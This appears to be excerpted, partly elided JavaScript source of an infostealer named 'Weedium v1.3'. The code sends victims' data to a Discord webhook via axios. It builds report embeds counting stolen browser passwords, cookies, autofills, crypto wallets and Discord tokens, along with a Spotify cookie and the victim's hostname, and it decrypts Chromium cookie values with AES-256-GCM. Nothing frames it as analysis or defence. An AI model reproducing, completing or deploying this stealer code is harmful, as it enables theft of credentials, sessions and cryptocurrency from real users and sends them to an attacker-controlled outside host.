...
const pfp_web = 'https://i.ibb.co/3dw5MdT/logo-Weedium.png';
const weedname = 'Weedium v1.3';
...
function sendSuccessToWebhook() {
    ...
    axios.patch(discordWebhookUrl, data)
    .then(response => {
    ...
    try {
        ...
        const embedData = {
            ...
            fields: [
                ...
                { name: '<:browser:1095742866518716566> • Spotify Cookie:', value: '```' + cookie + '```', inline: false }
            ],
            footer: {
                text: `${user.hostname}`,
                icon_url: pfp_web
...
try {
    ...
    const combinedInfoEmbed = {
        ...
        fields: [
            {
                name: '<:blacklock:1095741022065131571> • Passwords:',
                value: '<:blackarrow:1095740975197995041> **' + passwordsCount.toString() + '**',
                inline: true,
            },
            {
                name: '<:browser:1095742866518716566> • Cookies:',
                value: '<:blackarrow:1095740975197995041> **' + count.cookies.toString() + '**',
                inline: true,
            },
            {
                name: '<:lol_role_fill:1187747599286018149> • Autofills:',
                value: '<:blackarrow:1095740975197995041> **' + autofillCount.toString() + '**',
                inline: true,
            },
            {                 
                name: '<:ETH:975438262053257236> • Wallet:',
                value: '<:blackarrow:1095740975197995041> **' + walletCount.toString() + '**',
                inline: true,
            },
            {
                name: '<:hackerblack:1095747410539593800> • Tokens:',
                value: '<:blackarrow:1095740975197995041> **' + discordTokensCount.toString() + '**',
                inline: true,
            },
            {
                name: '‎ ',
        ...
        await new Promise((resolve) => {
            db.each(
                ...
                function (err, row) {
                    ...
                    // Validate encrypted value length
                    if (encryptedValue.length < 29) {  // 3 bytes for prefix, 12 bytes IV, some ciphertext, 16 bytes AuthTag
                        console.error(`Invalid encrypted value for ${row.host_key}: ${encryptedValue}`);
                        return;
                    }

                    let iv = encryptedValue.slice(3, 15);  // IV should be exactly 12 bytes
                    let encryptedData = encryptedValue.slice(15, encryptedValue.length - 16);  // Encrypted data
                    let authTag = encryptedValue.slice(encryptedValue.length - 16);  // Auth tag (16 bytes)
                    let decrypted = '';

                    try {
                        // Ensure that browserPath[i][3] is the correct decryption key for AES-256-GCM
                    ...
                    // Store the decrypted cookie data
